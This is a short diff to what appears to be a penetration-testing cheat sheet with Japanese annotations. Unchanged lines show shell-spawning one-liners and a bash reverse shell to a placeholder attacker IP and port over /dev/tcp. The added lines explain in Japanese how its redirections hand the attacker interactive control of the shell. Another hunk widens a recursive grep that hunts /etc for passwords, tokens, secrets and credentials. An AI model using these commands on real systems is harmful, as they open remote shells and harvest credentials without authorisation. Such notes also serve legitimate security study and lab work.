@@ -68,6 +68,9 @@ import os; echo "os.system('/bin/bash')"
 ```bash
 bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1
 ```
+- >& 標準出力(stdout) と 標準エラー(stderr) を同じ場所へリダイレクト。つまり：bash の出力全部→ TCP接続先へ送る
+- 0>&1   0 = stdin 1 = stdout   つまり：stdin を stdout と同じ先へ向ける結果：攻撃者 → stdin
+標的bash → stdout/stderr → 攻撃者 双方向通信になる。
 
 ```bash
 perl -e 'exec "/bin/sh";'
@@ -350,7 +353,7 @@ grep -r "pass" /etc 2>/dev/null
 ```
 
 ```bash
-grep -rinE '(password|username|user|pass|key|token|secret|admin|login|credentials|cred)'
+grep -rinE '(password|pword|username|user|pass|key|token|secret|admin|login|credentials|cred)'
 ```
 
 👉 Common locations:
